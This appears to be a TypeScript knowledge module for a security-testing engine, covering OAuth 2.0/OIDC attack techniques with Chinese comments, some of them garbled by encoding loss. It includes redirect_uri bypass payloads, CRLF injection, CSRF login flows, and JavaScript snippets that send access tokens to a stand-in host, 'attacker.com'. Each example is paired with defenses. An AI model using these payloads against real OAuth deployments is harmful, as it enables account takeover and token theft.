/**
 * HOS-Sec-Engine V2 - OAuth Attack Skills
 * OAuth 流程攻击技术专?Skill 集合
 */

import { AttackDefenseSkill } from '\.\./\.\./\.\./types/skill';

export const oauthAttackSkills: AttackDefenseSkill[] = [
    {
        metadata: {
            id: 'api-oauth-001',
            name: 'OAuth Flow Attack Techniques',
            category: 'api',
            subCategory: 'oauth',
            riskLevel: 'critical',
            confidence: 0.91,
            updatedAt: '2026-06',
            author: 'HOS-Sec-Engine',
            tags: ['oauth', 'oauth2', 'oidc', 'authorization-code', 'csrf', 'token-theft', 'redirect-uri', 'pkce', 'state-parameter', 'implicit-grant'],
        },
        trigger: {
            scenarios: [
                '目标应用使用 OAuth 2.0 ?OpenID Connect (OIDC) 进行第三方登录或 API 授权',
                '存在 "Login with Google/GitHub/Facebook" 等社交登录按',
                'API 使用 OAuth access_token ?OIDC id_token 进行认证',
                'OAuth 授权码流程（Authorization Code Flow）用?Web 或移动应',
                '隐式授权流程（Implicit Grant）用于单页应?(SPA)',
                '设备授权流程（Device Authorization）用?IoT 或无浏览器设',
                '客户端凭证流程（Client Credentials）用于服务间通信',
            ],
            keywords: [
                'oauth',
                'oauth2',
                'openid',
                'oidc',
                'authorization code',
                'access token',
                'id token',
                'refresh token',
                'redirect_uri',
                'state parameter',
                'pkce',
                'code_verifier',
                'code_challenge',
                'implicit grant',
                'client credentials',
                'token endpoint',
                'authorization endpoint',
                'scope',
                'consent',
                'social login',
                '第三方登',
                'oauth 攻击',
                'token 泄露',
                '授权码拦',
                'redirect uri 操纵',
            ],
            aliases: [
                'oauth 绕过',
                'oauth csrf',
                'authorization code interception',
                'redirect uri manipulation',
                'state parameter bypass',
                'token leakage',
                'pkce bypass',
                'implicit grant attack',
                'oauth 劫持',
                'social login bypass',
            ],
            indicators: [
                '/oauth/authorize',
                '/oauth/token',
                '/oauth/callback',
                '/auth/callback',
                'code=',
                'state=',
                'redirect_uri=',
                'client_id=',
                'scope=',
                'response_type=code',
                'response_type=token',
                'access_token=',
                'id_token=',
                'grant_type=',
            ],
        },
        knowledge: {
            description: 'OAuth 2.0 ?OpenID Connect (OIDC) 是现代应用最广泛使用的授权和认证协议。OAuth 流程攻击利用协议实现中的配置错误、参数校验不严和流程设计缺陷，通过拦截授权码、操纵重定向 URI、绕?CSRF 保护、窃?token 等方式获取未授权访问。OAuth 的安全性依赖于多个安全机制的正确实现：state 参数?CSRF、redirect_uri 严格匹配、PKCE 防授权码拦截、token 安全传输和存储。任何一个环节的疏漏都可能导致认证绕过或 token 泄露',
            symptoms: [
                'OAuth 回调 URL 中的 authorization code 可被第三方截获并兑换 access_token',
                '修改 redirect_uri 参数为攻击者控制的 URL，授权码被发送到攻击者服务器',
                '缺少 state 参数导致 CSRF 攻击，攻击者可强制用户使用攻击者账户登',
                'OAuth token 通过 Referer 头泄露给第三方网',
                'Implicit Grant ?access_token ?URL fragment 中暴露（#access_token=xxx',
                'PKCE 未正确实现或 code_verifier 未验证，授权码可被拦截使',
                'Scope 未正确验证，获得?token 拥有超出预期的权?',
            ],
            rootCauses: [
                'redirect_uri 参数未严格白名单校验，允许攻击者控制回调地址',
                'state 参数未生成、未验证或可预测，无法防?CSRF 攻击',
                '授权?(authorization code) 未绑定客户端或会话，可被跨客户端使用',
                'PKCE (Proof Key for Code Exchange) 未实施或 code_verifier 未验',
                'Implicit Grant ?token 暴露?URL 中，可被浏览器历史、Referer、日志捕',
                'token 通过不安全的传输方式（HTTP 而非 HTTPS）传',
                'OAuth 客户端密?(client_secret) 硬编码在客户端代码中',
                'Scope 验证缺失，token 可访问超出授权范围的数据',
                'OIDC id_token 未验?signature ?aud (audience) 声明',
            ],
            observations: [
                'redirect_uri 开放重定向是最常见?OAuth 漏洞，占比超?40%',
                'state 参数缺失在移动应?OAuth 实现中尤为常',
                'PKCE 已成?OAuth 2.1 的强制要求，但很多系统仍未实',
                'Implicit Grant 已被 OAuth 2.1 弃用，但仍有大量 SPA 使用',
                'OAuth token 通过 Referer 头泄露是真实世界中被广泛利用的攻击向',
                'Google、GitHub、Facebook 等主?OAuth 提供商的实现通常安全，但第三方集成可能不安全',
                'OIDC session management 漏洞可导致跨应用会话劫持',
                '动态客户端注册 (DCR) 如果未做审批，可被用于注册恶?OAuth 客户?',
            ],
            commonMistakes: [
                'redirect_uri 使用子域名匹?(*.example.com) 而非精确匹配',
                'state 参数使用固定值或可预测的值（如时间戳',
                '在客户端代码（JavaScript、移动应用）中存?client_secret',
                '使用 Implicit Grant 而非 Authorization Code + PKCE',
                '不验?id_token ?signature ?aud 声明',
                '允许 redirect_uri 使用自定?scheme（myapp://callback）未做验',
                '授权码有效期过长（标准建议不超过 10 分钟',
                'access_token 有效期过长或?refresh token 轮换机制',
                'Scope 未在 token 兑换时验证，用户可请求任?scope',
            ],
            notes: [
                'OAuth 2.0 规范 RFC 6749 ?RFC 6819 定义了安全最佳实',
                'OAuth 2.1 整合了所有安全建议，PKCE 成为强制要求',
                'OIDC Core 规范 (OpenID Connect Core 1.0) ?OAuth 2.0 之上添加了身份认证层',
                '测试 OAuth 安全需要控制一?OAuth 客户端并监控授权流程',
                'Burp Suite ?OAuth 2.0 插件可自动化测试常见 OAuth 漏洞',
            ],
        },
        action: {
            checklist: [
                '识别 OAuth 流程类型（Authorization Code、Implicit、Client Credentials、Resource Owner Password',
                '检?redirect_uri 参数是否接受任意 URL 或仅白名?URL',
                '验证 state 参数是否存在、是否随机、是否在回调时验',
                '检?PKCE 是否实施（code_challenge ?code_verifier',
                '测试授权码是否可被截获并兑换?access_token',
                '检?token 传输方式（HTTPS、是否在 URL fragment 中暴露）',
                '测试 Referer 头是否会泄露 token',
                '检?id_token 签名验证?aud 声明验证',
                '测试 scope 验证是否严格',
                '检?OAuth 客户端密钥是否暴露在客户端代码中',
                '测试动态客户端注册是否存在未审批注册漏',
                '检?token 刷新流程是否安全（refresh token 轮换?',
            ],
            techniques: [
                '授权码拦截：截获 authorization code 并在攻击者客户端兑换 token',
                'redirect_uri 操纵：将回调地址指向攻击者控制的服务',
                'state 参数 CSRF：缺?state 时构造恶?OAuth 链接强制用户登录攻击者账',
                'Referer ?token 泄露：诱导用户从?token 的页面跳转到攻击者站',
                'Implicit Grant token 盗窃：从 URL fragment 中获?access_token',
                'PKCE 绕过：不发?code_verifier 或使用弱 code_challenge_method',
                'Scope 提升：请求超出预期的 scope 获取更高权限',
                'Token 重放：使用过期或已撤销?token 访问 API',
                'OIDC id_token 伪造：跳过签名验证接受伪造的身份声明',
                'OAuth 开放重定向：利?redirect_uri 参数将用户重定向到恶意站?',
            ],
            examples: [
                {
                    name: 'Authorization Code 拦截攻击',
                    description: '截获 OAuth 授权码并在攻击者控制的客户端兑?access_token',
                    content: "步骤 1: 诱导用户访问恶意 OAuth 授权链接\n" +
                        "https://oauth-provider.com/authorize?\n" +
                        "  response_type=code\n" +
                        "  &client_id=ATTACKER_CLIENT_ID\n" +
                        "  &redirect_uri=https://attacker.com/callback\n" +
                        "  &scope=read_profile+read_email\n" +
                        "  &state=random123\n\n" +
                        "步骤 2: 用户登录后，OAuth 提供商将授权码发送到攻击者回调地址\n" +
                        "https://attacker.com/callback?code=AUTH_CODE_XXX&state=random123\n\n" +
                        "步骤 3: 攻击者使用截获的授权码兑?access_token\n" +
                        "POST https://oauth-provider.com/oauth/token\n" +
                        'Content-Type: application/x-www-form-urlencoded\n\n' +
                        'grant_type=authorization_code\n' +
                        '&code=AUTH_CODE_XXX\n' +
                        '&redirect_uri=https://attacker.com/callback\n' +
                        '&client_id=ATTACKER_CLIENT_ID\n' +
                        '&client_secret=ATTACKER_CLIENT_SECRET\n\n' +
                        "响应:\n" +
                        '{\n' +
                        '  "access_token": "ya29.xxx",\n' +
                        '  "token_type": "Bearer",\n' +
                        '  "expires_in": 3600,\n' +
                        '  "refresh_token": "1//0xxx",\n' +
                        '  "scope": "read_profile read_email"\n' +
                        '}\n\n' +
                        "步骤 4: 使用 access_token 访问用户数据\n" +
                        "GET https://api.provider.com/user/profile\n" +
                        "Authorization: Bearer ya29.xxx\n\n" +
                        "防御: 实施 PKCE，授权码绑定客户端和 redirect_uri，缩短授权码有效?",
                },
                {
                    name: 'redirect_uri 操纵攻击',
                    description: '修改 redirect_uri 参数将授权码?token 发送到攻击者控制的地址',
                    content: "正常 OAuth 授权请求:\n" +
                        "https://oauth-provider.com/authorize?\n" +
                        "  response_type=code\n" +
                        "  &client_id=legitimate_client_id\n" +
                        "  &redirect_uri=https://legitimate-app.com/callback\n" +
                        "  &scope=read_profile\n" +
                        "  &state=abc123\n\n" +
                        "攻击 1 - 任意 redirect_uri:\n" +
                        "https://oauth-provider.com/authorize?\n" +
                        "  response_type=code\n" +
                        "  &client_id=legitimate_client_id\n" +
                        "  &redirect_uri=https://attacker.com/steal\n" +
                        "  &scope=read_profile\n" +
                        "  &state=abc123\n" +
                        "?如果未严格校?redirect_uri，授权码将发送到 attacker.com\n\n" +
                        "攻击 2 - 子域名绕?\n" +
                        "合法 redirect_uri: https://app.example.com/callback\n" +
                        "攻击 redirect_uri: https://attacker.example.com/callback\n" +
                        "?如果只校验域名后缀 example.com，子域名可绕过\n\n" +
                        "攻击 3 - 路径绕过:\n" +
                        "合法 redirect_uri: https://app.example.com/callback\n" +
                        "攻击 redirect_uri: https://app.example.com/callback.evil.com\n" +
                        "? https://app.example.com@attacker.com/callback\n" +
                        "? https://app.example.com%2F%40attacker.com/\n\n" +
                        "攻击 4 - 换行符注?(CRLF):\n" +
                        "redirect_uri=https://app.example.com/callback%0d%0aSet-Cookie:%20session=attacker\n\n" +
                        "攻击 5 - 开放重定向?\n" +
                        "redirect_uri=https://app.example.com/redirect?url=https://attacker.com\n" +
                        "?利用目标应用的开放重定向漏洞间接控制回调地址\n\n" +
                        "防御: redirect_uri 必须精确匹配预注册的 URI，不接受通配符或模式匹配",
                },
                {
                    name: 'State 参数缺失导致 CSRF 攻击',
                    description: 'OAuth 流程中缺?state 参数验证，攻击者可强制用户使用攻击者账户登',
                    content: "场景: 目标应用使用 OAuth 社交登录，未使用 state 参数\n\n" +
                        "步骤 1: 攻击者使用自己的账户发起 OAuth 授权，获取授权码\n" +
                        "https://oauth-provider.com/authorize?\n" +
                        "  response_type=code\n" +
                        "  &client_id=TARGET_CLIENT_ID\n" +
                        "  &redirect_uri=https://target-app.com/oauth/callback\n" +
                        "  &scope=read_profile\n" +
                        "  (?state 参数)\n\n" +
                        "步骤 2: 用户登录成功后，回调 URL ?\n" +
                        "https://target-app.com/oauth/callback?code=ATTACKER_CODE\n\n" +
                        "步骤 3: 攻击者诱导受害者点击恶意链?\n" +
                        "https://target-app.com/oauth/callback?code=ATTACKER_CODE\n\n" +
                        "步骤 4: 目标应用处理回调:\n" +
                        "- ?ATTACKER_CODE 兑换 access_token\n" +
                        "- ?token 获取用户信息（攻击者的账户信息）\n" +
                        "- 将受害者会话绑定到攻击者账户\n" +
                        "- 受害者现在以攻击者身份登录\n\n" +
                        "攻击效果:\n" +
                        "- 受害者看到的个人资料是攻击者的\n" +
                        "- 如果应用有账户关联功能，受害者账户可能被关联到攻击者身份\n" +
                        "- 攻击者可以受害者的身份执行操作（取决于应用逻辑）\n\n" +
                        "防御: 必须生成随机 state 参数，存储在服务?session 中，回调时严格验证\n" +
                        "state 应该?cryptographically random，不可预测，单次使用",
                },
                {
                    name: 'OAuth Token 通过 Referer 头泄',
                    description: '?OAuth token 的页面引用第三方资源，token 通过 Referer 头泄',
                    content: "场景: SPA 使用 Implicit Grant，access_token ?URL fragment 中\n\n" +
                        "步骤 1: 用户完成 OAuth 授权，被重定向到:\n" +
                        "https://spa-app.com/dashboard#access_token=ya29.xxx&token_type=Bearer&expires_in=3600\n\n" +
                        "步骤 2: 页面加载第三方资源（图片、脚本、iframe?\n" +
                        '<img src="https://attacker.com/track.png">\n' +
                        '<iframe src="https://attacker.com/page.html">\n' +
                        '<script src="https://cdn.attacker.com/lib.js">\n\n' +
                        "步骤 3: 浏览器发送请求时携带 Referer ?\n" +
                        "GET https://attacker.com/track.png\n" +
                        "Referer: https://spa-app.com/dashboard#access_token=ya29.xxx&token_type=Bearer...\n\n" +
                        "步骤 4: 攻击者服务器记录 Referer 头，获取 access_token\n\n" +
                        "变体: Meta 标签泄露\n" +
                        '<meta name="referrer" content="unsafe-url">  // 强制发送完?URL\n\n' +
                        "变体: window.location 泄露\n" +
                        "<script>\n" +
                        "  fetch('https://attacker.com/collect?token=' + window.location.hash);\n" +
                        "</script>\n\n" +
                        "防御:\n" +
                        "- 使用 Authorization Code + PKCE 替代 Implicit Grant\n" +
                        "- token 存储?httpOnly cookie 或内存中，不?URL 中\n" +
                        "- 设置 <meta name=\"referrer\" content=\"strict-origin-when-cross-origin\">\n" +
                        "- 避免在含 token 的页面加载第三方资源",
                },
                {
                    name: 'Implicit Grant Token 盗窃',
                    description: '利用 Implicit Grant 流程?token ?URL fragment 暴露的弱点窃?token',
                    content: "Implicit Grant 流程:\n" +
                        "1. 用户被重定向?OAuth 提供商授权页面\n" +
                        "2. 用户授权后被重定向回客户?\n" +
                        "   https://spa-app.com/callback#access_token=ya29.xxx&token_type=Bearer&expires_in=3600\n\n" +
                        "攻击向量 1 - 浏览器历?\n" +
                        "- URL fragment 不发送到服务器，但保存在浏览器历史记录中\n" +
                        "- 其他用户或恶意扩展可访问历史记录\n" +
                        "- history API 可通过 navigation events 捕获 fragment\n\n" +
                        "攻击向量 2 - 日志记录:\n" +
                        "- 代理服务器、CDN、WAF 可能记录完整 URL\n" +
                        "- 浏览器开发者工具网络面板显示完?URL\n" +
                        "- 移动应用日志可能打印 redirect URL\n\n" +
                        "攻击向量 3 - XSS 结合:\n" +
                        "如果 SPA 存在 XSS 漏洞:\n" +
                        "<script>\n" +
                        "  const token = window.location.hash.split('access_token=')[1].split('&')[0];\n" +
                        "  fetch('https://attacker.com/steal?token=' + token);\n" +
                        "</script>\n\n" +
                        "攻击向量 4 - 恶意浏览器扩?\n" +
                        "- 扩展可访问所有页面的 URL 包括 fragment\n" +
                        "- 可拦截和修改 OAuth 回调\n\n" +
                        "OAuth 2.1 已弃?Implicit Grant，推荐使?Authorization Code + PKCE",
                },
                {
                    name: 'PKCE 绕过攻击',
                    description: 'PKCE (Proof Key for Code Exchange) 未正确实施或绕过，授权码可被拦截使用',
                    content: "正常 PKCE 流程:\n" +
                        "1. 客户端生?code_verifier (随机 43-128 字符)\n" +
                        "2. 计算 code_challenge = BASE64URL(SHA256(code_verifier))\n" +
                        "3. 授权请求携带 code_challenge ?code_challenge_method=S256\n" +
                        "4. Token 兑换时携?code_verifier\n" +
                        "5. 服务端验?code_verifier 与之前存储的 code_challenge 匹配\n\n" +
                        "攻击 1 - 服务端未验证 code_verifier:\n" +
                        "POST /oauth/token\n" +
                        'grant_type=authorization_code\n' +
                        '&code=INTERCEPTED_CODE\n' +
                        '&redirect_uri=https://app.com/callback\n' +
                        '&client_id=CLIENT_ID\n' +
                        ' (?code_verifier)\n' +
                        "?如果服务端不要求 code_verifier，截获的授权码可直接使用\n\n" +
                        "攻击 2 - 使用?code_challenge_method (plain):\n" +
                        "code_challenge=S3cur3V3r1f13r&code_challenge_method=plain\n" +
                        "?plain 模式?code_challenge = code_verifier，截获授权请求即可获取\n" +
                        "?应强制使?S256 (SHA256) 方法\n\n" +
                        "攻击 3 - code_verifier 可预?\n" +
                        "如果 code_verifier 使用弱随机数生成（如时间戳、Math.random）\n" +
                        "攻击者可枚举或预?code_verifier\n\n" +
                        "攻击 4 - code_challenge 未绑定授权码:\n" +
                        "如果服务端不?code_challenge 与授权码关联\n" +
                        "攻击者可截获授权码并用任?code_verifier 兑换\n\n" +
                        "防御:\n" +
                        "- 强制使用 code_challenge_method=S256\n" +
                        "- 验证 code_verifier 与授权码绑定\n" +
                        "- code_verifier 使用 cryptographically secure random 生成",
                },
                {
                    name: 'Scope 提升攻击',
                    description: '请求超出预期?OAuth scope 获取更高权限?access_token',
                    content: "正常授权请求:\n" +
                        "https://oauth-provider.com/authorize?\n" +
                        "  response_type=code\n" +
                        "  &client_id=CLIENT_ID\n" +
                        "  &redirect_uri=https://app.com/callback\n" +
                        "  &scope=read_profile\n" +
                        "  &state=abc123\n\n" +
                        "攻击 1 - 请求额外 scope:\n" +
                        "https://oauth-provider.com/authorize?\n" +
                        "  response_type=code\n" +
                        "  &client_id=CLIENT_ID\n" +
                        "  &redirect_uri=https://app.com/callback\n" +
                        "  &scope=read_profile+write_profile+delete_account+admin\n" +
                        "  &state=abc123\n" +
                        "?如果用户授权且服务端未验?scope，token 将获得额外权限\n\n" +
                        "攻击 2 - Scope 注入:\n" +
                        "scope=read_profile%20admin:write%20superuser\n" +
                        "?利用 scope 解析逻辑注入额外权限\n\n" +
                        "攻击 3 - 动?Scope 注册:\n" +
                        "部分 OAuth 提供商允许动态注?scope\n" +
                        "攻击者注册自定义 scope 并请求\n\n" +
                        "验证方法:\n" +
                        "1. 检?token 响应中的 scope 字段\n" +
                        "2. 使用 token 访问高权?API 端点\n" +
                        "3. 检查服务端是否验证?token ?scope 声明\n\n" +
                        "防御:\n" +
                        "- 服务端验?token scope 是否匹配客户端注册范围\n" +
                        "- 用户授权页面明确显示请求?scope\n" +
                        "- 敏感 scope 需要额外审批或 MFA",
                },
            ],
        },
        validation: {
            indicators: [
                '截获?authorization code 可成功兑?access_token',
                '修改 redirect_uri 后授权码被发送到攻击者控制的地址',
                '缺少 state 参数?OAuth 回调被正常处',
                'Referer 头中包含 access_token ?id_token',
                'Implicit Grant ?token 可从 URL fragment 中提',
                'PKCE code_verifier 缺失或错误时 token 兑换仍然成功',
                '请求额外 scope ?token 包含未授权的权限',
            ],
            successSigns: [
                '成功获取其他用户?access_token ?id_token',
                '使用截获?token 访问受保护的 API 返回 200',
                'OAuth 回调处理了未预期?redirect_uri',
                'CSRF 攻击成功，受害者账户被绑定到攻击者身',
                'Scope 提升?token 可访问高权限资源',
            ],
            falsePositiveSigns: [
                'redirect_uri 被拒?(400 Bad Request)，说明校验正',
                '缺少 state 时回调被拒绝 (400/403)',
                'PKCE code_verifier 不匹配返?invalid_grant',
                'Token 兑换返回 invalid_client ?invalid_grant',
                'Scope 被限制在客户端注册范围内，额?scope 被忽',
                'Implicit Grant 被禁用，强制使用 Authorization Code',
            ],
        },
        defense: {
            recommendations: [
                '始终使用 Authorization Code Flow + PKCE，弃?Implicit Grant',
                'redirect_uri 严格白名单校验，精确匹配不接受通配',
                '生成随机 state 参数并在回调时验证，防止 CSRF 攻击',
                '实施 PKCE，强?code_challenge_method=S256，验?code_verifier',
                '授权码有效期不超?10 分钟，单次使用后立即失效',
                'access_token 有效期尽量短?-60 分钟），使用 refresh token 轮换',
                'token 通过 HTTPS 传输，存储在 httpOnly secure cookie 或内存中',
                '不在 URL 中传?token（避?Referer 泄露、历史记录暴露）',
                '验证 id_token ?signature、iss、aud、exp 声明',
                'Scope 在服务端验证，token scope 不超过客户端注册范围',
                '客户端密?(client_secret) 只存储在服务器端，不嵌入客户端代',
                '实施 token 绑定（DPoP ?mTLS）防?token 重放',
                '监控异常 OAuth 流量模式（异?redirect_uri、高?token 兑换等）',
            ],
            mitigations: [
                '定期审计 OAuth 客户端注册，删除不再使用的客户端',
                '实施 OAuth 安全策略检查工具（?OAuth Scanner、OAuth2lib',
                '使用 OAuth 提供商的安全最佳实践指南配',
                '对用户进?OAuth 授权页面安全意识培训',
                '实施 OAuth token 吊销机制，支持即时撤销泄露 token',
            ],
            references: [
                'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_OAuth',
                'https://portswigger.net/web-security/oauth',
                'https://tools.ietf.org/html/rfc6749',
                'https://tools.ietf.org/html/rfc7636',
                'https://tools.ietf.org/html/rfc8252',
                'https://openid.net/specs/openid-connect-core-1_0.html',
                'https://oauth.net/2/',
                'https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html',
            ],
        },
        quality: {
            confidence: 0.91,
            reviewed: true,
            tested: true,
            lastVerified: '2026-06',
        },
        playbooks: ['api-security-review'],
        phase: 'auth-testing',
        enabled: true,
    },
];
